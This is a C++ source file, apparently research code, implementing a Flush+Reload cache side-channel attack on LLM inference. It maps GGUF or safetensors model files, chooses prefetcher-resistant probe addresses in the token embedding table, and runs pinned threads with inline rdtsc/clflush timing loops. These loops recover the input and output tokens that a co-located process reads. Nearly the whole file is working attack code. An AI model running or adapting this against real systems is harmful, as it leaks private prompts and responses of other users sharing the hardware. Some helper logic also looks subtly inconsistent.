#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <cerrno>
#include <climits>
#include <cstdint>
#include <vector>
#include <set>
#include <fstream>
#include <thread>
#include <semaphore.h>
#include <algorithm>
#include <queue>
#include <random>
#include <iostream>

#include <nlohmann/json.hpp>
using json = nlohmann::json;

#include <fcntl.h>
#include <unistd.h>
#include <ext/stdio_filebuf.h>
#define SAFETENSORS_CPP_IMPLEMENTATION
#include "safetensors-cpp/safetensors.hh"

#include "util.h"
#include "attack.hh"

#undef ENABLE_EA
#include "config-database.hh"

int Attacker::init(const std::string &weight_file, const std::string &model_type) {
    int ret;

    auto params = str_split(model_type, ':');
    if (!params[0].compare("gguf")) {
        //
        // GGUF
        //
        unsigned long tgt_img_size;
        uint8_t *tgt_image = (uint8_t *)get_shared_memory(weight_file.c_str(), &tgt_img_size);
        if (!tgt_image) {
            return 1;
        }
        
        //** parse model file
        struct gguf_init_params params = {
            /*.no_alloc = */ true,
        };

        struct gguf_context *ctx_gguf = gguf_init_from_file(weight_file.c_str(), params);
        if (!ctx_gguf) {
            printf("%s: failed to load model from %s\n", __func__, weight_file.c_str());
            return 1;
        }

        auto dump_tensor_names = [&]() {
            for(unsigned i=0;i<ctx_gguf->header.n_tensors;++i) {
                printf("%s\n", ctx_gguf->infos[i].name.data);
            }
        };

        const int idx = gguf_find_tensor(ctx_gguf, cfg().token_embd_name.c_str());

        if (idx < 0) {
            printf("%s: tensor '%s' not found in the file", __func__, cfg().token_embd_name.c_str());
            dump_tensor_names();
            return 1;
        }

        size_t embd_off = gguf_get_data_offset(ctx_gguf) + gguf_get_tensor_offset(ctx_gguf, idx);
        embed_ptr = tgt_image + embd_off;
        printf("Embed file offset = %lu\n", embd_off);
        
        if (ctx_gguf->infos[idx].n_dims != EMBED_N_DIMS) {
            printf("invalid embed dims\n");
            return 1;
        }

        auto type = ctx_gguf->infos[idx].type;
        printf("embd type = %s\n", get_type_name(type));
        unsigned elem_size = ggml_type_size(type);
        embed_nb[0] = elem_size;
        embed_nb[1] = embed_nb[0]*(ctx_gguf->infos[idx].ne[0]/ggml_blck_size(type));
        for (int i = 2; i < EMBED_N_DIMS; i++) {
            embed_nb[i] = embed_nb[i - 1]*ctx_gguf->infos[idx].ne[i - 1];
        }

        llm_load_arch(ctx_gguf, arch);
        llm_load_hparams(ctx_gguf, arch, num_vocab, n_embd);
        printf("num_vocab = %u\n", num_vocab);
        printf("n_embd = %u\n", n_embd);
        for(unsigned i=0;i<2;++i)
            printf("embed_nb[%u] = %d\n", i, embed_nb[i]);

        // transposed
        if ( (ctx_gguf->infos[idx].ne[0] != n_embd) ||
                (ctx_gguf->infos[idx].ne[1] != num_vocab) ) {
            printf("invalid embed weight shape\n");
            return 1;
        }
        assert(ctx_gguf->infos[idx].ne[2]==1);

        // lock virtual memory
    #if 0
        mem_lock.init(embed_ptr);
        size_t embed_nbytes;
        size_t blck_size = ggml_blck_size(type);
        if (blck_size == 1) {
            embed_nbytes = ggml_type_size(type);
            for (int i = 0; i < GGML_MAX_DIMS; ++i) {
                embed_nbytes += (ctx_gguf->infos[idx].ne[i] - 1)*embed_nb[i];
            }
        }
        else {
            embed_nbytes = ctx_gguf->infos[idx].ne[0]*embed_nb[0]/blck_size;
            for (int i = 1; i < GGML_MAX_DIMS; ++i) {
                embed_nbytes += (ctx_gguf->infos[idx].ne[i] - 1)*embed_nb[i];
            }
        }
        std::cout << "mlock size = " << embed_nbytes << std::endl;
        if (!mem_lock.grow_to(embed_nbytes)) {
            std::cerr << "failed to lock the virtual memory" << std::endl;
            return 1;
        }
    #endif

        ret = llm_load_vocab(ctx_gguf, vocab, arch);
        if (ret)
            return ret;
    
    } else if (!params[0].compare("safetensors")) {
        //
        // safetensors
        //
        assert(params.size() == 3);

        // load tokenizer model (in gguf format)
        auto token_model = params[1];
        struct gguf_init_params gguf_params = {
            /*.no_alloc = */ true,
        };
        struct gguf_context *ctx_gguf = gguf_init_from_file(token_model.c_str(), gguf_params);
        if (!ctx_gguf) {
            printf("%s: failed to load tokenizer model from %s\n", __func__, token_model.c_str());
            return 1;
        }
        llm_load_arch(ctx_gguf, arch);
        llm_load_hparams(ctx_gguf, arch, num_vocab, n_embd);
        printf("num_vocab = %u\n", num_vocab);
        printf("n_embd = %u\n", n_embd);
        ret = llm_load_vocab(ctx_gguf, vocab, arch);
        if (ret)
            return ret; 

        // get the embedding table
        std::string bin_file = weight_file + "/" + params[2];
        std::string warn, err;
        st = new safetensors::safetensors_t;
        std::cout << "bin_file = " << bin_file << std::endl;
        bool ret = safetensors::mmap_from_file(bin_file, st, &warn, &err);

        if (warn.size()) {
            std::cout << "WARN: " << warn << "\n";
        }

        if (!ret) {
            std::cerr << "Failed to load: " << bin_file << "\n";
            std::cerr << "  ERR: " << err << "\n";
            return 1;
        }

        // Check if data_offsets are valid.
        if (!safetensors::validate_data_offsets(*st, err)) {
            std::cerr << "Invalid data_offsets\n";
            std::cerr << err << "\n";
            return 1;
        }

        std::string dst;
        for (size_t i = 0; i < st->metadata.size(); i++) {
            // do something with __metadata__
            assert(st->metadata.at(i, &dst));
            std::cout << dst << std::endl;
            std::cout << st->metadata.keys()[i] << ":" << dst << std::endl;
        }

        safetensors::tensor_t ts;
        assert(st->tensors.at("model.embed_tokens.weight", &ts));
        
        std::cout << "dtype = " << ts.dtype << std::endl; // BF16
        embed_ptr = st->databuffer_addr + ts.data_offsets[0];
        
        assert(ts.dtype == safetensors::kFLOAT16 || ts.dtype == safetensors::kBFLOAT16);
        embed_nb[0] = 2;
        assert(ts.shape[0] == num_vocab);
        embed_nb[1] = embed_nb[0] * ts.shape[1];
        std::cout << "nb: " << embed_nb[0] << "," << embed_nb[1] << std::endl;

    } else {
        std::cerr << "Unknown model type " << model_type << std::endl;
        return 1;
    }

    // partition the threads
    std::cout << "Num candidates = " << num_vocab << std::endl;

    //printf("%lu\n", uintptr_t(embed_ptr)%PAGE_SIZE);
    //return 1;

    // overcome perfetchers
    //** get the address offset of embedding table
    struct segment {
        size_t vocab;
        uintptr_t start,end;
        inline bool operator<(const segment &a) const {
            return start < a.start;
        }
    };
    size_t nextline_space = 2000;
    std::unordered_map<size_t, uintptr_t> token2pages;
retry:
{
    assert(nextline_space < embed_nb[1]);

    std::vector<segment> sorted_seg;
    for(size_t v=0; v <num_vocab; v++) {
        uintptr_t start_va = uintptr_t(embed_ptr + v*embed_nb[1]),
            end_va = uintptr_t(embed_ptr + v*embed_nb[1] + embed_nb[1] - 1);
        sorted_seg.emplace_back(segment{v, start_va + nextline_space, end_va});
    }
    std::sort(sorted_seg.begin(), sorted_seg.end());

      //** choose target addresses that satisfy the constraints to overcome prefetchers
    std::unordered_set<size_t> sel_tokens;
    auto maxpage = uintptr_t(embed_ptr + embed_nb[1]*num_vocab+embed_nb[1]-1)/PAGE_SIZE*PAGE_SIZE
            + PAGE_SIZE /* extra page */;
    printf("cp = %lx, maxpage = %lx\n", uintptr_t(embed_ptr)/PAGE_SIZE*PAGE_SIZE, maxpage);
    for (uintptr_t cp = uintptr_t(embed_ptr)/PAGE_SIZE*PAGE_SIZE;
        cp <= maxpage; cp += PAGE_SIZE) {

        uintptr_t center_ptr = cp + PAGE_SIZE/2;
        uintptr_t cp_cacheline_start = (center_ptr / CACHELINE_SIZE) * CACHELINE_SIZE,
            cp_cacheline_end = cp_cacheline_start + CACHELINE_SIZE - 1;

        // find target address from ranges
        // binary search
        segment *segit = nullptr;
        int left = 0;
        int right = sorted_seg.size() - 1;

        while (left <= right) {
            int mid = left + (right - left) / 2;
            if (sorted_seg[mid].start <= center_ptr) {
                segit = &sorted_seg[mid];
                left = mid + 1;
            } else {
                right = mid - 1;
            }
        }
        bool found = false;
        if(segit) {
            #if 0
                if (cp_cacheline_start <= segit->start && segit->start <= cp_cacheline_end) {
                    assert(!(cp_cacheline_start <= segit->end && segit->end <= cp_cacheline_end));
                    cp_cacheline_start += CACHELINE_SIZE;
                    cp_cacheline_end += CACHELINE_SIZE;
                    printf("1\n");
                    assert(cp_cacheline_end <= segit->end);
                    
                }
                if ((cp_cacheline_start <= segit->end) && (segit->end <= cp_cacheline_end)) {
                    assert(cp_cacheline_start >= CACHELINE_SIZE);
                    cp_cacheline_start -= CACHELINE_SIZE;
                    cp_cacheline_end -= CACHELINE_SIZE;
                    printf("2\n");
                    assert(cp_cacheline_start >= segit->start);
                }
            #endif
            
            // avoid duplicate probing of the same target address range
            if (/*(segit->start <= cp_cacheline_start && segit->end >= cp_cacheline_end) && */
                    sel_tokens.find(segit->vocab) == sel_tokens.end()) {
                sel_tokens.insert(segit->vocab);
                token2pages[segit->vocab] = center_ptr;
                //printf("%lx\n", center_ptr);
                found = true;
            }
        }
        //if (!found) printf("nf %lx\n", cp);
    }
}
    if(token2pages.size() != num_vocab) {
        printf("WARNING: dropped targets %lu %lu\n", token2pages.size(), num_vocab);
        std::cout << token2pages.size() << "\n";
        if (nextline_space) {
            printf("Reduced the nextline space to %lu, retrying\n", nextline_space);
            --nextline_space;
            token2pages.clear();
            goto retry;
        } else {
            printf("Unimplemented case, sorry\n");
            return 1;

            token2pages.clear();
            for (size_t v=0; v< num_vocab; ++v) {
                token2pages[v] = uintptr_t(embed_ptr + embed_nb[1]*v + embed_nb[1]/2);
            }
        }
    }

    constexpr auto NULL_POS = uintptr_t(-1);

    //** avoid storing valid pointers in the array, to overcome AoP prefetchers
    std::vector<uintptr_t>  ptr_offset(num_vocab);
    //uintptr_t lv=0;
    for (size_t v = 0; v< num_vocab; ++v) {
#if 1
        if (token2pages.find(v) != token2pages.end()) {
            ptr_offset[v] = (token2pages[v] - uintptr_t(embed_ptr));
        } else {
            ptr_offset[v] = NULL_POS; // error handling if we cannot find a target address for the v-th voacb
        }   
#else
        //ptr_offset[v] = uintptr_t(embed_ptr + v * embed_nb[1] + embed_nb[1]/2) - uintptr_t(embed_ptr);
        
        auto d = token2pages[v] -lv;
        if ( d<8192) {
            uint8_t *non = new uint8_t[PAGE_SIZE];
            memset(non,1,PAGE_SIZE);
            for(unsigned b=0;b<PAGE_SIZE/CACHELINE_SIZE;++b){
                flush(non + b*CACHELINE_SIZE);
            }
            ptr_offset[v] = (uintptr_t(non) - uintptr_t(embed_ptr));
        } else {
            ptr_offset[v] = (token2pages[v] - uintptr_t(embed_ptr));
        }
#endif
        //printf("%ld\n", token2pages[v]-lv);
        //lv =page;
    }

    //** collect the cache trace
    const auto low_threshold = cfg().low_threshold;
    const auto high_threshold = cfg().high_threshold;
    auto num_partitions = 15;
    for (size_t t = 0; t < num_partitions; ++t) {
        auto part = new partition;
        part->running.store(true);

        part->td = new std::thread([=]() {
            AsyncRingBuffer<CacheTraceElement>::node *cur_wr_node;
            // conventional settings for flush+reload to avoid sharing L1 cache
            // and reduce preempting
            pin_processor(t);
            set_highest_unprivileged_priority();

            size_t m = std::ceil(double(num_vocab) / num_partitions);
            auto n = (t == num_partitions - 1) ? num_vocab % m : m;
            
            // optional sanity check: validate the permutation
            std::unordered_set<uintptr_t> permu_map;
            for (size_t v = 0; v < n; ++v) {
                // shuffle the address via a pseudo random permutation
                auto s = t * m + ((v * 167 + 13) % n); // two random coprime integers
                permu_map.insert(ptr_offset[s]);
            }
            assert(permu_map.size() == n);

            // flush all the target addr
            for (size_t v = 0; v < n; ++v) {
                flush((void *)((uintptr_t(embed_ptr) + ptr_offset[t * m + v])));
            }
            
            while(part->running.load()) {
                // allocate a node in the cache trace queue
                cur_wr_node = part->cache_trace.alloc_slow();
                for (size_t v = 0; v < n; ++v) {
                    // shuffle the address via a pseudo random permutation
                    auto s = t * m + ((v * 167 + 13) % n); // two random coprime integers

                    if (ptr_offset[s] == NULL_POS) // error handling
                        continue;

                    // restore the pointer
                    register auto p = (void *)((uintptr_t(embed_ptr) + ptr_offset[s]));
                    uint32_t lo, hi, lo0, hi0;
                    // reload
                    asm __volatile__ (
                        "mfence         \n"
                        "rdtsc          \n"
                        "lfence \n"
                        "movl %%eax, %%esi \n"
                        "movl %%edx, %%edi \n"
                        "mov (%4), %%ax		\n"
                        "mfence         \n"
                        "rdtsc          \n"
                        "clflush (%4)  \n"
                        "movl %%esi, %0 \n"
                        "movl %%edi, %1 \n"
                            : "=r" (lo0), "=r" (hi0), "=a" (lo), "=d" (hi)
                            : "b" (p)
                            : "%esi", "%edi", "memory");

                    auto timepoint = COMB64(lo, hi); // make UINT64
                    auto latency = timepoint - COMB64(lo0, hi0);
                    if ((latency > low_threshold) && (latency < high_threshold)) {
                        //std::cout << s << ":" << latency << std::endl;
                        cur_wr_node->emplace_back(CacheTraceElement{s, latency, timepoint});
                    }
                }
                part->cache_trace.add_slow(cur_wr_node);
            }
        });
        pool.push_back(part);
    }

    return 0;
}

int Attacker::Tensor::init(struct gguf_context *ctx_gguf,
                            uint8_t *tgt_image,
                            const char *name) {
    auto idx = gguf_find_tensor(ctx_gguf, name);
    if (idx < 0) {
        printf("%s: tensor '%s' not found in the file", __func__, name);
        return 1;
    }

    size_t off = gguf_get_data_offset(ctx_gguf) + gguf_get_tensor_offset(ctx_gguf, idx);
    ptr = tgt_image + off;
    printf("%s file offset = %lu\n", name, off);
    auto type = ctx_gguf->infos[idx].type;

    if (ctx_gguf->infos[idx].n_dims != EMBED_N_DIMS) {
        printf("invalid embed dims\n");
        return 1;
    }
    assert(ctx_gguf->infos[idx].ne[2]==1 && ctx_gguf->infos[idx].ne[3]==1);

    unsigned elem_size = ggml_type_size(type);
    nb[0] = elem_size;
    nb[1] = nb[0]*(ctx_gguf->infos[idx].ne[0]/ggml_blck_size(type));
    for (int i = 2; i < EMBED_N_DIMS; i++) {
        nb[i] = nb[i - 1]*ctx_gguf->infos[idx].ne[i - 1];
    }

    size_t blck_size = ggml_blck_size(type);
    if (blck_size == 1) {
        nbytes = ggml_type_size(type);
        for (int i = 0; i < 2; ++i) {
            nbytes += (ctx_gguf->infos[idx].ne[i] - 1)*nb[i];
        }
    }
    else {
        nbytes = ctx_gguf->infos[idx].ne[0]*nb[0]/blck_size;
        for (int i = 1; i < 2; ++i) {
            nbytes += (ctx_gguf->infos[idx].ne[i] - 1)*nb[i];
        }
    }
    printf("%s shape [%lu,%lu] nbytes=%lu\n", name,
        ctx_gguf->infos[idx].ne[0],
        ctx_gguf->infos[idx].ne[1], nbytes);
    return 0;
}


Attacker::~Attacker() {
    for(auto &p : pool) {
        p->running.store(false);
        p->td->join();
        delete p->td;
        delete p;
    }
}
int Attacker::loop(const std::function<int()> &query, int echo, long query_time_us) {
    char buf[256];
    bool first = true;
    auto out = [&](const CacheTraceElement &res) {
        if (echo) {
            int ret = llama_token_to_piece(num_vocab, vocab, res.row, buf, sizeof(buf));
            if (ret < 0)
                strcpy(buf, "(err)");
            else
                buf[ret] = '\0';
            if (echo==1) {
                printf("%u (%s) : %lu\n", res.row, buf, res.latency);
            } else {
                if (first) {
                    first=false;
                    std::cout << std::endl << "Got Input Tokens (Unordered) + Output Tokens:" << std::endl;
                }
                std::cout << buf << std::flush;
            }
        } 
        detected.emplace_back(res);
    };

    detected.clear();

    int exited = 0;
    clock_t exit_time=0, timeout = 0.5*CLOCKS_PER_SEC;
    for(;;) {
        for(auto &p : pool) {
            auto n = p->cache_trace.get_slow_timed(query_time_us*1000L);
            if (n) {
                for(const auto &res : *n) {
                    out(res);
                }
                if (exited) {
                    exit_time = clock();
                }
                p->cache_trace.put_slow(n);
            }
            if (!exited) {
                if ((exited = query())) {
                    exit_time = clock();
                }
            } else {
                // wait for draining the queue
                if (clock() - exit_time > timeout)
                    return exited;
            }
        }
    }
    return 0;
}

int Attacker::save_results(const std::string &database) {
    json detected_obj = json::array();
    for(auto &res : detected) {
        json res_obj = {res.row, res.latency, res.timestamp};
        detected_obj.emplace_back(res_obj);
    }

    json item = {
        {"d", detected_obj},
    };

    std::ofstream fout(database);
    if (!fout)
        return 1;
    fout << item;
    return 0;
}

static std::pair<size_t,size_t> match_cluster(const std::vector<double> &tbe, size_t off) {
    const unsigned K=4; // min length of the cluster
    const double MAX_BACTHED_TBE = 1e-3;
    if (tbe.size() < K)
        return std::make_pair(size_t(-1), size_t(-1));
    size_t segment_start = size_t(-1);
    for (size_t s = off ; s < tbe.size() - K; ++s) {
        bool found = true;
        for (size_t k = 0; k < K; ++k) {
            if (tbe[s+k] > MAX_BACTHED_TBE) {
                found = true;
                break;
            }
        }
        if (found) {
            segment_start = s;
            break;
        }
    }

    size_t segment_end = size_t(-1);
    if (segment_start != size_t(-1)) {
        for (size_t s = segment_start; s < tbe.size()-K; ++s) {
            if (tbe[s] > MAX_BACTHED_TBE) {
                segment_end = s;
                break;
            }
        }
    }
    return std::make_pair(segment_start, segment_end);
}


std::vector<Attacker::CacheTraceElement> Attacker::get_detected() {
    std::vector<bool> dropped(detected.size());
    if (detected.size()) {
        std::vector<double> tbe(detected.size()-1);
        std::sort(detected.begin(), detected.end(), [](const Attacker::CacheTraceElement &a, const Attacker::CacheTraceElement &b) -> bool {
            return a.timestamp < b.timestamp;
        });
        for (size_t i = 0; i < detected.size()-1; ++i) {
            tbe[i] = tsc2sec(detected[i+1].timestamp - detected[i].timestamp);
        }
        size_t off = 0;
        // skip the evens of shared output embedding, for a very small number of transformers
        // this can also prevent recording too many noise events to the disk
        std::fill(dropped.begin(), dropped.end(), false);
        while(off < tbe.size()) {
            auto cluster = match_cluster(tbe, off);
            if (cluster.first != size_t(-1) && cluster.second != size_t(-1)) {
                if (cluster.second - cluster.first + 1 > 4096) {
                    for (size_t x = cluster.first; x <= cluster.second; ++x) {
                        dropped[x] = true;
                    }
                }
                off = cluster.second + 1;
            } else {
                break;
            }
        }
    }

    std::vector<CacheTraceElement> results;
    for(size_t i = 0; i < detected.size(); ++i) {
        if (!dropped[i]) {
            results.emplace_back(detected[i]);
        }
    }
#if VERBOSE
    std::cout << "Num Dropped " << detected.size() - results.size() << std::endl;
#endif
    return results;
}

inline void *round_down_ptr(void *p, uintptr_t s) {
    return (void *)((uintptr_t(p) / s) * s);
}
